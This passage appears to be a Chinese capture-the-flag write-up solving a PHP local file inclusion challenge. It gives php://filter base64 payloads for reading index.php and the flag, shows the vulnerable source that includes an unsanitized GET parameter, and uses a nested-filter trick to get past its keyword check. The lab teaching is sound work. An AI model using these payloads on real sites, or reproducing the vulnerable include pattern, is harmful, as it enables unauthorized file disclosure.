首先利用PHP伪协议读取index.php源代码  
payload如下：

```perl
php://filter/read=convert.base64-encode/resource=index
```

结果如图所示  
![](https://img2020.cnblogs.com/blog/1965233/202009/1965233-20200906222205008-946306717.png)  
源代码如下

```php
<?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
```

利用include函数尝试包含flag

```bash
index.php?category=woofers/../flag
```

发现没有读出来任何东西，但是源码里有这样一个提示  
![](https://img2020.cnblogs.com/blog/1965233/202009/1965233-20200906222449908-1276131.png)

#### 新知识点！

php://filter伪协议可以套一层协议，就像：

```bash
php://filter/read=convert.base64-encode/woofers/resource=flag
```

这样提交的参数既有woofers又包含了flag  
最后得到flag  
![](https://img2020.cnblogs.com/blog/1965233/202009/1965233-20200906222805663-2131064713.png)







![[Pasted image 20231226222716.png]]


